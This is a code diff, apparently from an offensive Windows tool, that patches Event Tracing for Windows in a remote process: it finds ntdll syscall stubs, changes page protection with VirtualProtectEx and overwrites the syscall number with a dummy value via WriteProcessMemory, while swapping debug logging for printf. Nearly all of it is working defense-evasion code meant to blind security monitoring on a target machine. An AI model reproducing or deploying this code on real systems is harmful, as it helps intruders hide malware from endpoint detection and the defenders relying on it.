@@ -2,7 +2,7 @@
 
 PBYTE findRetInstruction(PVOID function_start) {
 	unsigned char* ptr = (unsigned char*)function_start;
-	for (int i = 0; i < 0x500; i++) { // Scan up to 256 bytes (arbitrary limit)
+	for (int i = 0; i < 0x400; i++) { // Scan up to 1024 bytes (arbitrary limit)
 		if (ptr[i] == 0xC3) {         // Check for RET instruction (0xC3)
 			return &ptr[i];
 		}
@@ -84,33 +84,29 @@ BOOL CallBasedEtwPatch(HANDLE hProcess, LPSTR functionName) {
 
 BOOL SyscallPatchEtw(HANDLE hProcess, LPSTR syscallName) {
 	DWORD dwOldProtection = 0;
-	PBYTE pLocalSyscall = NULL;
-	PBYTE pRemoteSyscall = NULL;
-
-	if (!hProcess) {
-		hProcess = GetCurrentProcess();
-	}
+	BYTE* pLocalSyscall = NULL;
+	BYTE* pRemoteSyscall = NULL;
 
 	// 1. Get local address of the syscall function
 	HMODULE hLocalNtdll = GetModuleHandleA("ntdll");
 	if (!hLocalNtdll) {
-		DebugPrint("[!] Failed to get local ntdll handle\n");
+		printf("[!] Failed to get local ntdll handle\n");
 		return FALSE;
 	}
 
-	pLocalSyscall = (PBYTE)GetProcAddress(hLocalNtdll, syscallName);
+	pLocalSyscall = (BYTE*)GetProcAddress(hLocalNtdll, syscallName);
 	if (!pLocalSyscall) {
-		DebugPrint("[!] GetProcAddress failed for %s\n", syscallName);
+		printf("[!] GetProcAddress failed for %s\n", syscallName);
 		return FALSE;
 	}
-	DebugPrint("\t> Local address of \"%s\": 0x%p\n", syscallName, pLocalSyscall);
+	printf("\t> Local address of \"%s\": 0x%p\n", syscallName, pLocalSyscall);
 
 	// 2. Get remote ntdll.dll base address (same as before)
 	HMODULE hRemoteNtdll = NULL;
 	MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
 	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
 	if (hModuleSnap == INVALID_HANDLE_VALUE) {
-		DebugPrint("[!] CreateToolhelp32Snapshot failed\n");
+		printf("[!] CreateToolhelp32Snapshot failed\n");
 		return FALSE;
 	}
 	BOOL found = FALSE;
@@ -126,18 +122,18 @@ BOOL SyscallPatchEtw(HANDLE hProcess, LPSTR syscallName) {
 	CloseHandle(hModuleSnap);
 
 	if (!found) {
-		DebugPrint("[!] Failed to find ntdll.dll in remote process\n");
+		printf("[!] Failed to find ntdll.dll in remote process\n");
 		return FALSE;
 	}
 
 	// 3. Calculate offset of syscall function inside local ntdll.dll
-	ptrdiff_t offset = pLocalSyscall - (PBYTE)hLocalNtdll;
+	ptrdiff_t offset = pLocalSyscall - (BYTE*)hLocalNtdll;
 
 	// 4. Calculate remote function address
-	pRemoteSyscall = (PBYTE)hRemoteNtdll + offset;
+	pRemoteSyscall = (BYTE*)hRemoteNtdll + offset;
 
 	// 5. Find SSN pointer in local function
-	PBYTE pLocalSSNPtr = NULL;
+	BYTE* pLocalSSNPtr = NULL;
 	for (int i = 0; i < x64_SYSCALL_STUB_SIZE; i++) {
 		if (pLocalSyscall[i] == x64_MOV_INSTRUCTION_OPCODE) {
 			pLocalSSNPtr = &pLocalSyscall[i + 1];
@@ -147,7 +143,7 @@ BOOL SyscallPatchEtw(HANDLE hProcess, LPSTR syscallName) {
 			return FALSE;
 	}
 	if (!pLocalSSNPtr) {
-		DebugPrint("[!] Failed to find SSN pointer in local function\n");
+		printf("[!] Failed to find SSN pointer in local function\n");
 		return FALSE;
 	}
 
@@ -155,12 +151,12 @@ BOOL SyscallPatchEtw(HANDLE hProcess, LPSTR syscallName) {
 	ptrdiff_t ssnOffset = pLocalSSNPtr - pLocalSyscall;
 
 	// 6. Calculate remote SSN pointer address
-	PBYTE pRemoteSSNPtr = pRemoteSyscall + ssnOffset;
-	DebugPrint("\t> Remote SSN pointer position: 0x%p\n", pRemoteSSNPtr);
+	BYTE* pRemoteSSNPtr = pRemoteSyscall + ssnOffset;
+	printf("\t> Remote SSN pointer position: 0x%p\n", pRemoteSSNPtr);
 
 	// 7. Change protection in remote process
-	if (!VirtualProtectEx(hProcess, pRemoteSSNPtr, sizeof(DWORD), PAGE_READWRITE, &dwOldProtection)) {
-		DebugPrint("[!] VirtualProtectEx failed with error %d\n", GetLastError());
+	if (!VirtualProtectEx(hProcess, pRemoteSSNPtr, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtectEx failed with error %d\n", GetLastError());
 		return FALSE;
 	}
 
@@ -168,18 +164,18 @@ BOOL SyscallPatchEtw(HANDLE hProcess, LPSTR syscallName) {
 	DWORD dummySSN = 0x000000FF;
 	SIZE_T bytesWritten = 0;
 	if (!WriteProcessMemory(hProcess, pRemoteSSNPtr, &dummySSN, sizeof(DWORD), &bytesWritten) || bytesWritten != sizeof(DWORD)) {
-		DebugPrint("[!] WriteProcessMemory failed with error %d\n", GetLastError());
+		printf("[!] WriteProcessMemory failed with error %d\n", GetLastError());
 		return FALSE;
 	}
 
 	// 9. Restore original protection
 	DWORD dwDummy = 0;
 	if (!VirtualProtectEx(hProcess, pRemoteSSNPtr, sizeof(DWORD), dwOldProtection, &dwDummy)) {
-		DebugPrint("[!] VirtualProtectEx restore failed with error %d\n", GetLastError());
+		printf("[!] VirtualProtectEx restore failed with error %d\n", GetLastError());
 		return FALSE;
 	}
 
-	DebugPrint("[+] PatchSyscallRemote applied successfully!\n");
+	printf("[+] PatchSyscallRemote applied successfully!\n");
 	return TRUE;
 }
 
@@ -189,10 +185,6 @@ BOOL JmpRetBasedEtwPatch(HANDLE hProcess, LPSTR functionName) {
 	BYTE        pShellcode[7]   = { 0 };
 	DWORD       jmpOffset       = 0;
     PBYTE       pFunctionAddr  = NULL;
-
-	if (hProcess == NULL) {
-		hProcess = NtCurrentProcess();
-	}
 
 	DebugPrint(">> Current process: %d\n", GetCurrentProcessId());
 	DebugPrint(">> Target process: %d\n", GetProcessId(hProcess));
